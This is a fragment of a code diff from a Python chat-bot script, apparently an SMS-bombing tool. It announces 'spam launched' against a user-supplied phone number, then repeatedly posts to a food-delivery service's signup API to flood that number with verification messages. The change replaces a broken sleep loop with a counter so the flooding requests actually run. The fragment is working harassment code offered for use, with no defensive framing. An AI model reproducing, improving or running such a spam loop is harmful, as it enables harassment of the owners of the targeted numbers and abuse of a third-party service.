@@ -108,8 +108,9 @@ try:
                         i = int(i)
                     write_message(user, '💣 Спам запущен!')
                     write_message(user, "Номер: " f'{userr}' "\nВремя: 2 минуты!")
-
-                    while time.sleep(120):
+                    c = 0
+                    while 9 > c:
+                        c +=1
                         try:
                             requests.post(
                                 "https://api.delitime.ru/api/v2/signup",
